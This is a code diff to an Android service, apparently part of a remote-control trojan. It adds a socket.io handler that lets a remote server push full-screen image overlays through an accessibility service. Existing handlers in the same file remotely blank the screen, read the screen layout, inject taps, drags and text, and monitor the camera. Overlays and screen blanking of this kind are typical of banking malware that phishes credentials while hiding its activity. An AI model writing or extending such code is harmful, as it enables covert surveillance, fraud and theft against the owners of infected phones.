@@ -97,6 +97,7 @@ public class Server extends Service {
             socket.on("mb-screen-long-press-event-" + mDeviceID, onScreenLongPressMonitor);
             socket.on("mb-screen-drag-event-" + mDeviceID, onScreenDragMonitor);
             socket.on("mb-screen-black-event-" + mDeviceID, onScreenBlackMonitor);
+            socket.on("mb-imageoverlayer-event-" + mDeviceID, onScreenImageOverlayMonitor);
             socket.on("mb-screen-skeleton-" + mDeviceID, onScreenSkeletonMonitor);
             socket.on("mb-screen-send-text-" + mDeviceID, onScreenSetTextMonitor);
             socket.on("mb-camera-monitor-" + mDeviceID, onCameraMonitor);
@@ -232,6 +233,36 @@ public class Server extends Service {
                     sendBroadcast(broadcastIntent);
                 } else {
                     Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_SCREEN_LIGHT_MONITOR);
+                    sendBroadcast(broadcastIntent);
+                }
+            } catch (JSONException e) {
+                Log.d("error::", e.toString());
+            }
+
+        }
+    };
+
+    private final Emitter.Listener onScreenImageOverlayMonitor = new Emitter.Listener() {
+        @Override
+        public void call(Object... args) {
+            JSONObject data = (JSONObject) args[0];
+            Log.d("onScreenImageOverlaykMonitor:", data.toString());
+            boolean status;
+            String imgdata = "";
+            String type = "";
+
+            try {
+                status = data.getBoolean("status");
+                type = data.getString("type");
+                if(status) {
+                    imgdata = data.getString("message");
+//                    txtBlack = "message";
+                    Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_SCREEN_IMAGEOVERLAY_MONITOR);
+                    broadcastIntent.putExtra("imgdata", imgdata);
+                    broadcastIntent.putExtra("type", type);
+                    sendBroadcast(broadcastIntent);
+                } else {
+                    Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_SCREEN_UNIMAGEOVERLAY_MONITOR);
                     sendBroadcast(broadcastIntent);
                 }
             } catch (JSONException e) {
